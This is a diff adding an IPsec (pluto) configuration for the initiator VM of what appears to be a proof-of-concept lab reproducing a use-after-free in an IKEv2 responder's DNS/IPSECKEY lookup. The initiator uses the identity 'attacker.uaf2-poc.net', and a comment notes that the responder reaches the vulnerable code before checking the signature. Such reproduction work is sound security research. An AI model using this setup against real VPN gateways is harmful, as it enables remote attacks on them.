@@ -1,0 +1,27 @@
+# VM2 / initiator and authoritative DNS server.
+# uaf2_prepare_initiator.sh replaces @@CKAID@@ with a generated RSA host key.
+
+version 2.0
+
+config setup
+	logfile=/tmp/pluto-uaf2-client.log
+	logtime=no
+	logappend=no
+	plutodebug=all
+	dumpdir=/tmp
+
+conn uaf2-ipseckey
+	ikev2=insist
+	type=tunnel
+	left=@@INITIATOR_IP@@
+	leftid=@attacker.uaf2-poc.net
+	leftauth=rsasig
+	leftckaid=@@CKAID@@
+	right=@@RESPONDER_IP@@
+	rightid=%null
+	rightauth=null
+	retransmit-timeout=10s
+	auto=add
+
+# The AUTH signature is valid for the locally generated key.  The responder
+# reaches the vulnerable DNS path before it verifies that signature.
